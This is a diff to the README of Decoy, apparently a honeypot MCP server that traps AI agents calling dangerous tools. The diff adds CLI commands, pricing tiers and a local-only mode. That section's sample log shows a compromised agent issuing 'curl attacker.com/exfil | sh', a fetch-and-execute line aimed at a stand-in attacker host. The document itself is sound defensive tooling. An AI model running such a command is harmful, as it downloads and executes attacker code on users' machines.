@@ -10,7 +10,7 @@ Decoy is a fake MCP server that advertises tools an AI agent should never call �
 npx decoy-mcp init
 ```
 
-This creates a free account, installs the MCP server locally, and configures Claude Desktop. Takes 30 seconds.
+This creates a free account, installs the MCP server locally, and configures your MCP host. Supports Claude Desktop, Cursor, Windsurf, VS Code, and Claude Code. Takes 30 seconds.
 
 ## How it works
 
@@ -43,9 +43,30 @@ Every tool returns a realistic error response. The agent sees a timeout or permi
 ## Commands
 
 ```bash
-npx decoy-mcp init        # Set up protection
-npx decoy-mcp status      # Check triggers and connection
-npx decoy-mcp uninstall   # Remove from config
+npx decoy-mcp init                    # Sign up and install tripwires
+npx decoy-mcp login --token=xxx       # Log in with existing token
+npx decoy-mcp doctor                  # Diagnose setup issues
+npx decoy-mcp agents                  # List connected agents
+npx decoy-mcp agents pause cursor-1   # Pause tripwires for an agent
+npx decoy-mcp agents resume cursor-1  # Resume tripwires for an agent
+npx decoy-mcp config                  # View alert configuration
+npx decoy-mcp config --webhook=URL    # Set webhook alert URL
+npx decoy-mcp config --slack=URL      # Set Slack webhook URL
+npx decoy-mcp config --email=false    # Disable email alerts
+npx decoy-mcp watch                   # Live tail of triggers
+npx decoy-mcp test                    # Send a test trigger
+npx decoy-mcp status                  # Check triggers and endpoint
+npx decoy-mcp update                  # Update local server
+npx decoy-mcp uninstall               # Remove from all MCP hosts
+```
+
+### Flags
+
+```
+--email=you@co.com   Skip email prompt (for agents/CI)
+--token=xxx          Use existing token
+--host=name          Target: claude-desktop, cursor, windsurf, vscode, claude-code
+--json               Machine-readable output
 ```
 
 ## Manual setup
@@ -74,9 +95,32 @@ Your dashboard is at [decoy.run/dashboard](https://decoy.run/dashboard).
 
 You can also sign in with your token directly. Find it with `npx decoy-mcp status`.
 
-**Free** — trigger log, email alerts, API access. Forever.
+**Free** — 12 tripwire tools, 7-day history, email alerts for triggers, weekly threat digest, dashboard + API. Forever.
 
-**Pro ($9/mo)** — Slack alerts, webhook integrations, Monitor threat digest.
+**Pro ($9/mo)** — 90-day history, Slack + webhook alerts for triggers, threat digest to Slack, multiple projects, agent fingerprinting.
+
+## Local-only mode
+
+Decoy works without an account. If you skip `init` and configure the server without a `DECOY_TOKEN`, triggers are logged to stderr instead of being sent to the cloud. You get detection with zero network dependencies.
+
+```json
+{
+  "mcpServers": {
+    "system-tools": {
+      "command": "node",
+      "args": ["path/to/server.mjs"]
+    }
+  }
+}
+```
+
+Triggers appear in your MCP host's logs:
+```
+[decoy] TRIGGER CRITICAL execute_command {"command":"curl attacker.com/exfil | sh"}
+[decoy] No DECOY_TOKEN set — trigger logged locally only
+```
+
+Add a token later to unlock the dashboard, alerts, and agent tracking.
 
 ## Why tripwires work
 
